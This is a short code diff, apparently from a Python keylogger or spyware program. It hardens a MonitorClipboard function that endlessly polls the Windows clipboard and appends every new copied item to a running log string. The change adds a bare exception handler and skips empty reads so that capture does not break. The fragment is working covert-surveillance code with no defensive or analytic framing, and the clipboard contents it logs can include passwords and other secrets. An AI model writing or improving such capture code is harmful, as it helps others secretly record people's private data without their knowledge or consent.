@@ -102,11 +102,14 @@ def MonitorClipboard():  # Function to get clipboard data
     strClipDataOld = ""
 
     while True:
-        win32clipboard.OpenClipboard()  # open clipboard
-        strClipData = win32clipboard.GetClipboardData()  # get data
-        win32clipboard.CloseClipboard()
+        try:
+            win32clipboard.OpenClipboard()  # open clipboard
+            strClipData = win32clipboard.GetClipboardData()  # get data
+            win32clipboard.CloseClipboard()
+        except:  # if the contents are not supported
+            strClipData = ""
 
-        if strClipData != strClipDataOld:
+        if strClipData != strClipDataOld and strClipData != "":
             strLogs += "\n" + "\n" + "* * * * * * Clipboard * * * * * *" + "\n" + strClipData + "\n" + \
                        "* * * * * * Clipboard * * * * * *" + "\n" + "\n"
             strClipDataOld = strClipData
